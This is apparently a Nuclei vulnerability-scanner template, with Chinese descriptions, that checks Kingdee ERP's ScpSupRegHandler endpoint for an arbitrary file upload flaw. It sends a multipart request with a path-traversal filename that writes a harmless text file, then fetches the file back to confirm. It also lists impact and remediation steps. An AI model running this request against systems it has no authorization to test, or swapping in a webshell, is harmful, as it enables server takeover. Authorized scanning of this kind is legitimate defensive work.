id: kingdee-scpsupreghandler-file-upload
info:
  name: 金蝶 ERP scpsupreghandler 接口 - 任意文件上传漏洞
  author: xiaobaicai
  severity: high
  description: |
    该模板用于检测 金蝶 ERP scpsupreghandler 接口 - 任意文件上传漏洞。该类漏洞通常源于上传接口缺少认证、文件类型校验、存储隔离或执行权限控制。模板会向 `/k3cloud/SRM/ScpSupRegHandler`、`/k3cloud/uploadfiles/{{s2}}.txt` 等位置发送探测请求，并结合响应状态、关键字、错误信息、时间差或外带交互等证据判断目标是否受影响。
  impact: |
    - 攻击者可能上传脚本、WebShell 或恶意文件，并借此执行代码或长期控制服务器。
    - 上传目录若可被访问或解析，可能导致数据篡改、恶意内容投递和业务系统被接管。
  remediation: |
    - 为上传接口增加认证授权和 CSRF 防护，限制可上传文件类型、大小和扩展名。
    - 在服务端校验文件内容与 MIME 类型，将上传文件存储到不可执行目录并使用随机文件名。
    - 清理异常上传文件，复核上传目录解析配置、访问日志和可疑账号活动。
  reference:
    - https://stack.chaitin.com/vuldb/detail/eff4c35e-ee6c-4ef3-aa17-0debe079b983
  metadata:
    verified: true
    max-request: 2
    vuln-id: CT-949212
    vendor: kingdee
    product: erp
  tags: fileupload,vuln,kingdee
variables:
  s1: '{{rand_int(10000, 99999)}}'
  s2: '{{to_lower(rand_text_alpha(8))}}'
  rboundary: '{{to_lower(rand_text_alpha(8))}}'
flow: http(1) && http(2)
http:
  - method: POST
    path:
      - '{{BaseURL}}/k3cloud/SRM/ScpSupRegHandler'
    redirects: false
    headers:
      Content-Type: multipart/form-data; boundary={{rboundary}}
    body: |-
      --{{rboundary}}
      Content-Disposition: form-data; name="dbId_v"

      .
      --{{rboundary}}
      Content-Disposition: form-data; name="FID"

      2022
      --{{rboundary}}
      Content-Disposition: form-data; name="FAtt"; filename="../../../../uploadfiles/{{s2}}.txt"
      Content-Type: text/plain

      {{s1}}

      --{{rboundary}}--
    matchers:
      - type: dsl
        dsl:
          - 'status_code == 200 && contains(body, "true")'
  - method: GET
    path:
      - '{{BaseURL}}/k3cloud/uploadfiles/{{s2}}.txt'
    redirects: false
    matchers:
      - type: dsl
        dsl:
          - 'status_code == 200 && contains(body, to_string(s1))'
